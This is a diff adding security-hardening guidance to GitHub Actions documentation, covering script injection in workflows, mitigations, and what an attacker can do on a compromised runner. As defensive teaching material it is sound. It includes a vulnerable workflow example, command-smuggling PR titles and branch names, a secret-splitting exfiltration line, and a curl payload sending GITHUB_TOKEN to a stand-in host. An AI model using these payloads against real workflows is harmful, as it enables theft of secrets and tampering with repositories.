@@ -12,6 +12,7 @@ versions:
 type: overview
 topics:
   - Security
+miniTocMaxHeadingLevel: 4
 ---
 
 {% data reusables.actions.enterprise-beta %}
@@ -49,11 +50,117 @@ To help prevent accidental disclosure, {% data variables.product.product_name %}
     - You can use required reviewers to protect environment secrets. A workflow job cannot access environment secrets until approval is granted by a reviewer. For more information about storing secrets in environments or requiring reviews for environments, see "[Encrypted secrets](/actions/reference/encrypted-secrets)" and "[Environments](/actions/reference/environments)."
 {% endif %}
 
+### Using `CODEOWNERS` to monitor changes
+
+You can use the `CODEOWNERS` feature to control how changes are made to your workflow files. For example, if all your workflow files are stored in `.github/workflows`, you can add this directory to the code owners list, so that any proposed changes to these files will first require approval from a designated reviewer.
+
+For more information, see "[About code owners](/github/creating-cloning-and-archiving-repositories/about-code-owners)."
+
+### Understanding the risk of script injections
+
+When creating workflows, [custom actions](/actions/creating-actions/about-actions), and [composite run step](/actions/creating-actions/creating-a-composite-run-steps-action) actions, you should always consider whether your code might execute untrusted input from attackers. This can occur when an attacker adds malicious commands and scripts to a context. When your workflow runs, those strings might be interpreted as code which is then executed on the runner.
+
+ Attackers can add their own malicious content to the [`github` context](/actions/reference/context-and-expression-syntax-for-github-actions#github-context), which should be treated as potentially untrusted input. These contexts typically end with `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`,`ref`, and `title`.  For example: `github.event.issue.title`, or `github.event.pull_request.body`.
+
+ You should ensure that these values do not flow directly into workflows, actions, API calls, or anywhere else where they could be interpreted as executable code. By adopting the same defensive programming posture you would use for any other privileged application code, you can help security harden your use of {% data variables.product.prodname_actions %}. For information on some of the steps an attacker could take, see ["Potential impact of a compromised runner](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)."
+
+In addition, there are other less obvious sources of potentially untrusted input, such as branch names and email addresses, which can be quite flexible in terms of their permitted content. For example, `zzz";echo${IFS}"hello";#` would be a valid branch name and would be a possible attack vector for a target repository.
+
+The following sections explain how you can help mitigate the risk of script injection.
+
+#### Example of a script injection attack
+
+A script injection attack can occur directly within a workflow's inline script. In the following example, an action uses an expression to test the validity of a pull request title, but also adds the risk of script injection:
+
+{% raw %}
+```
+      - name: Check PR title
+        run: |
+          title="${{ github.event.pull_request.title }}"
+          if [[ $title =~ ^octocat ]]; then
+          echo "PR title starts with 'octocat'"
+          exit 0
+          else
+          echo "PR title did not start with 'octocat'"
+          exit 1
+          fi
+```
+{% endraw %}
+
+This example is vulnerable to script injection because the `run` command executes within a temporary shell script on the runner. Before the shell script is run, the expressions inside {% raw %}`${{ }}`{% endraw %} are evaluated and then substituted with the resulting values, which can make it vulnerable to shell command injection.
+
+To inject commands into this workflow, the attacker could create a pull request with a title of  `a"; ls $GITHUB_WORKSPACE"`:
+
+![Example of script injection in PR title](/assets/images/help/images/example-script-injection-pr-title.png)
+
+In this example, the `"` character is used to interrupt the {% raw %}`title="${{ github.event.pull_request.title }}"`{% endraw %} statement, allowing the `ls` command to be executed on the runner. You can see the output of the `ls` command in the log:
+
+![Example result of script injection](/assets/images/help/images/example-script-injection-result.png)
+
+### Good practices for mitigating script injection attacks
+
+There are a number of different approaches available to help you mitigate the risk of script injection:
+
+#### Using an action instead of an inline script (recommended)
+
+The recommended approach is to create an action that processes the context value as an argument. This approach is not vulnerable to the injection attack, as the context value is not used to generate a shell script, but is instead passed to the action as an argument:
+
+{% raw %}
+```
+uses: fakeaction/checktitle@v3
+with:
+    title: ${{ github.event.pull_request.title }}
+```
+{% endraw %}
+
+#### Using an intermediate environment variable
+
+For inline scripts, the preferred approach to handling untrusted input is to set the value of the expression to an intermediate environment variable.
+
+The following example uses Bash to process the `github.event.pull_request.title` value as an environment variable:
+
+{% raw %}
+```
+      - name: Check PR title
+        env:
+          TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          if [[ "$TITLE" =~ ^octocat ]]; then
+          echo "PR title starts with 'octocat'"
+          exit 0
+          else
+          echo "PR title did not start with 'octocat'"
+          exit 1
+          fi
+```
+{% endraw %}
+
+In this example, the attempted script injection is unsuccessful:
+
+![Example of mitigated script injection](/assets/images/help/images/example-script-injection-mitigated.png)
+
+With this approach, the value of the {% raw %}`${{ github.event.issue.title }}`{% endraw %} expression is stored in memory and used as a variable, and doesn't interact with the script generation process. In addition, consider using double quote shell variables to avoid [word splitting](https://github.com/koalaman/shellcheck/wiki/SC2086), but this is [one of many](https://mywiki.wooledge.org/BashPitfalls) general recommendations for writing shell scripts, and is not specific to {% data variables.product.prodname_actions %}.
+
+#### Using CodeQL to analyze your code
+
+To help you manage the risk of dangerous patterns as early as possible in the development lifecycle, the {% data variables.product.prodname_dotcom %} Security Lab has developed [CodeQL queries](https://github.com/github/codeql/tree/main/javascript/ql/src/experimental/Security/CWE-094) that repository owners can [integrate](/github/finding-security-vulnerabilities-and-errors-in-your-code/configuring-code-scanning#running-additional-queries) into their CI/CD pipelines. For more information, see "[About code scanning](/github/finding-security-vulnerabilities-and-errors-in-your-code/about-code-scanning)."
+
+The scripts currently depend on the CodeQL JavaScript libraries, which means that the analyzed repository must contain at least one JavaScript file and that CodeQL must be [configured to analyze this language](/github/finding-security-vulnerabilities-and-errors-in-your-code/configuring-code-scanning#changing-the-languages-that-are-analyzed).
+
+- `ExpressionInjection.ql`: Covers the expression injections described in this article, and is considered to be reasonably accurate. However, it doesn’t perform data flow tracking between workflow steps.
+- `UntrustedCheckout.ql`: This script's results require manual review to determine whether the code from a pull request is actually treated in an unsafe manner. For more information, see "[Keeping your GitHub Actions and workflows secure: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests)"  on the {% data variables.product.prodname_dotcom %} Security Lab blog.
+
+#### Restricting permissions for tokens
+
+To help mitigate the risk of an exposed token, consider restricting the assigned permissions. For more information, see "[Modifying the permissions for the GITHUB_TOKEN](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token)."
+
 ### Using third-party actions
 
 The individual jobs in a workflow can interact with (and compromise) other jobs. For example, a job querying the environment variables used by a later job, writing files to a shared directory that a later job processes, or even more directly by interacting with the Docker socket and inspecting other running containers and executing commands in them.
 
-This means that a compromise of a single action within a workflow can be very significant, as that compromised action would have access to all secrets configured on your repository, and may be able to use the `GITHUB_TOKEN` to write to the repository. Consequently, there is significant risk in sourcing actions from third-party repositories on {% data variables.product.prodname_dotcom %}. You can help mitigate this risk by following these good practices:
+This means that a compromise of a single action within a workflow can be very significant, as that compromised action would have access to all secrets configured on your repository, and may be able to use the `GITHUB_TOKEN` to write to the repository. Consequently, there is significant risk in sourcing actions from third-party repositories on {% data variables.product.prodname_dotcom %}. For information on some of the steps an attacker could take, see ["Potential impact of a compromised runner](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)."
+
+You can help mitigate this risk by following these good practices:
 
 * **Pin actions to a full length commit SHA**
 
@@ -75,6 +182,40 @@ This means that a compromise of a single action within a workflow can be very si
 * **Pin actions to a tag only if you trust the creator**
 
   Although pinning to a commit SHA is the most secure option, specifying a tag is more convenient and is widely used. If you’d like to specify a tag, then be sure that you trust the action's creators. The ‘Verified creator’ badge on {% data variables.product.prodname_marketplace %} is a useful signal, as it indicates that the action was written by a team whose identity has been verified by {% data variables.product.prodname_dotcom %}. Note that there is risk to this approach even if you trust the author, because a tag can be moved or deleted if a bad actor gains access to the repository storing the action.
+
+### Potential impact of a compromised runner
+
+These sections consider some of the steps an attacker can take if they're able to run malicious commands on a {% data variables.product.prodname_actions %} runner.
+
+#### Accessing secrets
+
+Workflows triggered using the `pull_request` event have read-only permissions and have no access to secrets. However, these permissions differ for various event triggers such as `issue_comment`, `issues` and `push`, where the attacker could attempt to steal repository secrets or use the write permission of the job's [`GITHUB_TOKEN`](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token).
+
+- If the secret or token is set to an environment variable, it can be directly accessed through the environment using `printenv`.
+- If the secret is used directly in an expression, the generated shell script is stored on-disk and is accessible.
+- For a custom action, the risk can vary depending on how a program is using the secret it obtained from the argument:
+
+  {% raw %}
+  ```
+  uses: fakeaction/publish@v3
+  with:
+      key: ${{ secrets.PUBLISH_KEY }}
+  ```
+  {% endraw %}
+
+Although {% data variables.product.prodname_actions %} scrubs secrets from memory that are not referenced in the workflow (or an included action), the `GITHUB_TOKEN` and any referenced secrets can be harvested by a determined attacker.
+
+#### Exfiltrating data from a runner
+
+An attacker can exfiltrate any stolen secrets or other data from the runner. To help prevent accidental secret disclosure, {% data variables.product.prodname_actions %} [automatically redact secrets printed to the log](/actions/reference/encrypted-secrets#accessing-your-secrets), but this is not a true security boundary because secrets can be intentionally sent to the log. For example, obfuscated secrets can be exfiltrated using `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};`. In addition, since the attacker may run arbitrary commands, they could use HTTP requests to send secrets or other repository data to an external server.
+
+#### Stealing the job's `GITHUB_TOKEN`
+
+It is possible for an attacker to steal a job's `GITHUB_TOKEN`. The {% data variables.product.prodname_actions %} runner automatically receives a generated `GITHUB_TOKEN` with permissions that are limited to just the repository that contains the workflow, and the token expires after the job has completed. Once expired, the token is no longer useful to an attacker. To work around this limitation, they can automate the attack and perform it in fractions of a second by calling an attacker-controlled server with the token, for example: `a"; set +e; curl http://example.lab?token=$GITHUB_TOKEN;#`.
+
+#### Modifying the contents of a repository
+
+The attacker server can use the {% data variables.product.prodname_dotcom %} API to [modify repository content](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token), including releases, if the assigned permissions of `GITHUB_TOKEN` [are not restricted](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token).
 
 ### Considering cross-repository access
 
